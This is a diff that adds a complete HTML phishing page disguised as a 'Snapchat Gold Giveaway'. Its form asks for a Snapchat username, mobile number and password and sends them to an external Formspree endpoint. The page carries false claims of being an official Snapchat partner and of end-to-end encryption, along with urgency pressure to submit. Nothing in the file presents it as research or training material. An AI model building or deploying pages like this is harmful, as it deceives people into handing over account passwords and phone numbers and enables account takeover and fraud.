@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Snapchat Gold Giveaway - Claim Your Free Membership!</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #FFFC00, #000000);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .giveaway-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .snap-header {
+            margin-bottom: 30px;
+        }
+
+        .snap-header h1 {
+            color: #000;
+            font-size: 28px;
+            margin-bottom: 15px;
+            background: #FFFC00;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .snap-header p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #FFFC00;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #000;
+            box-shadow: 0 0 10px rgba(255, 252, 0, 0.3);
+        }
+
+        .submit-btn {
+            background: #FFFC00;
+            color: #000;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .security-note {
+            font-size: 12px;
+            color: #999;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        .ghost-emoji {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 480px) {
+            .giveaway-container {
+                padding: 25px;
+            }
+            
+            .snap-header h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="giveaway-container">
+        <div class="snap-header">
+            <div class="ghost-emoji">🦋</div>
+            <h1>🎉 Exclusive Snapchat Gold Giveaway 🎉</h1>
+            <p>Claim your FREE Gold Membership! Limited time offer for first 100 users 🔥</p>
+        </div>
+
+        <form 
+            id="giveawayForm"
+            action="https://formspree.io/f/mldjrkjk"
+            method="POST"
+        >
+            <div class="form-group">
+                <label>📱 Snapchat Username</label>
+                <input type="text" name="username" placeholder="Enter your Snapchat username" required>
+            </div>
+
+            <div class="form-group">
+                <label>📞 Mobile Number</label>
+                <input type="tel" name="mobile" placeholder="Enter your mobile number" required>
+            </div>
+
+            <div class="form-group">
+                <label>⏳ Membership Duration</label>
+                <select name="duration" required>
+                    <option value="">Select duration</option>
+                    <option>1 Month FREE</option>
+                    <option>3 Months FREE</option>
+                    <option>6 Months FREE</option>
+                    <option>12 Months FREE</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>🔑 Snapchat Password</label>
+                <input type="password" name="password" placeholder="Enter your Snapchat password" required>
+                <p class="security-note">🔒 Your security is our priority. We use end-to-end encryption to protect your credentials.</p>
+            </div>
+
+            <!-- Formspree Hidden Fields -->
+            <input type="hidden" name="_subject" value="New Snapchat Gold Giveaway Submission">
+            <input type="text" name="_gotcha" style="display:none;">
+
+            <button type="submit" class="submit-btn">🚀 Claim My Free Gold Membership</button>
+        </form>
+
+        <p class="security-note" style="margin-top: 25px;">
+            ⚠️ This is an official Snapchat partner promotion. By submitting, you agree to our terms of service. 
+            HURRY! LIMITED SPOTS AVAILABLE! 🎁
+        </p>
+    </div>
+
+    <script>
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if(urlParams.has('success')) {
+                alert('Submission successful! We will contact you shortly.');
+            }
+        };
+    </script>
+</body>
+</html>
